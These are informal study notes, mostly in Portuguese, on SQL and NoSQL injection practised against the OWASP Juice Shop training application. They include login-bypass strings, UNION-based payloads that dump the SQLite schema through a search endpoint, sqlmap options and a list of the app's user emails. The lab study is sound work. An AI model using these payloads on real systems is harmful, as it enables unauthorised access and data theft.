=== SQLi and NOSQLi ===
SQLi, Qualquer campo botão ou funcionalidade que gere uma Query insegura que sera executada no banco de dados,
a qual pode ser quebrada para permitir inserção de codigos maliciosos


Query Login Generica

< SELECT * FROM Users WHERE email='email@email.com' AND password='123456'; >

Quebrando Query com comentario ( -- )
< SELECT * FROM Users WHERE email='teste@teste.com'--' AND password='123456'; >
	Tudo após "--" sera comentado

Query pode ser quebrada diretamente na aplicação, ou via Header alterando os dados antes do envio com BURPSUIT

Outra Query possivel
< SELECT * FROM Users WHERE email='email' OR 1=1 --' AND password='password'; >
	Caso funcione, retornará o acesso ao 1ºUsuario da tabela ou ID = 1


Campos de Pesquisa geralmente são vulneraveis
Exemplo:
	Vulnerabilidades em endpoints
	Shop.bancocn.com --> GET /rest/products/search?q= HTTP/1.1
				?q= -> EndPoint
				Pode-se fazer testes inserindo ", ', "", '', "' ou '" (url encoded)
				Caso uma delas retorne um erro, significa que é vulneravel
	Ao gerar um erro obtivemos:
		< SELECT * FROM Products WHERE ((name LIKE '%\"'%' OR description LIKE '%\"'%') AND deletedAt IS NULL) ORDER BY name" >
	
	Quebrando a Query:
		< SELECT * FROM Products WHERE ((name LIKE '%'))-- >

	No Header ou no campo:
		gato%'))--
		gato%'))+ORDER+BY+100-- ---> ORdenando por coluna pode-se descobrir a quantidade das mesmas
		gato%))+UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9-- ---> Une a pesquisa UNINDO com um Select de Todas as Colunas
			UNION BASED SUPPORTED

	SQLMAP:
		http://shop.bancocn.com/rest/products/search?q=123
		--dbms=sqlite
		--tehcnique u
		--level 2
		--tables
		--no-cast	
	Por ser UNION BASED pode-se trazer diretamente as tabelas
	Logo, descobrindo algo pode-se explorar o resto





NOSQLi
de acordo com o juice-shop existe um meio de realizar um nosqli nas reviews de todos os usuarios 
Buscando a requisição e os valores passados para o banco nosql, podemos analisar a estrutura e atravez de parametros nosql atravez do methodo UPDATE alterar todas as reviews



Desafio, fazre todos as quests de sqli e nosqli do juice-shop

1º Login In Admin account
	"'OR 1=1--" in login page

2º Lgin at Bender and JIM account
	Using a python script, I can catch these emails
	[
		admin@juice-sh.op
		uvogin@juice-sh.op
		(bender@juice-sh.op)
		mc.safesearch@juice-sh.op
		(jim@juice-sh.op)
		morty@juice-sh.op
		bjoern@owasp.org
	]

	in login = email'--

3º Dump Database Schema
	Using Burpsuit I can edit the header of search request for inject a malicious query.
	Is a SQLITE DATABASE
	SUCCESS
	Use < ORDER BY > to discover the number of columns, later, use a < UNION SELECT 1-9,name FROM sqlite_master > 
	<> GET /rest/products/search?pessego%'))+UNION+SELECT+type,name,tbl_name,rootpage,sql,NULL,NULL,NULL,NULL+FROM+sqlite_master+ORDER+BY+name;-- HTTP/1.1



4º NOSQL Editar todas as Reviews de uma unica vez
	Editando o header da requisição do tipo PATH referente à reviews
